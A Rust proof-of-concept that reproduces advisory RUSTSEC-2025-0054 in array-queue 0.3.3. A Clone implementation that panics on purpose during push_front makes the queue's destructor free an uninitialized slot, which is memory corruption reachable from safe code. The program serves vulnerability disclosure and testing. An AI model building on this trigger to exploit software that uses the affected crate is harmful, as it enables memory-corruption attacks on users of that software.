//! RUSTSEC-2025-0054 / array-queue 0.3.3.
//!
//! The queue already contains one initialized element. `push_front` advances
//! the start index before invoking user `Clone`; a panic then makes Drop visit
//! an uninitialized slot.  ASan reports a fault in `free`; exact signal details
//! can vary because the destructor consumes uninitialized bytes.

#![forbid(unsafe_code)]

use array_queue::ArrayQueue;

struct CloneBomb(String);

impl Clone for CloneBomb {
    fn clone(&self) -> Self {
        if self.0.len() == 11 {
            panic!("intentional clone panic");
        }
        Self(self.0.clone())
    }
}

fn main() {
    let mut queue: ArrayQueue<[CloneBomb; 2]> = ArrayQueue::new();
    let _ = queue.push_front(&CloneBomb(String::from("0123456789")));
    let _ = queue.push_front(&CloneBomb(String::from("0123456789X")));
}
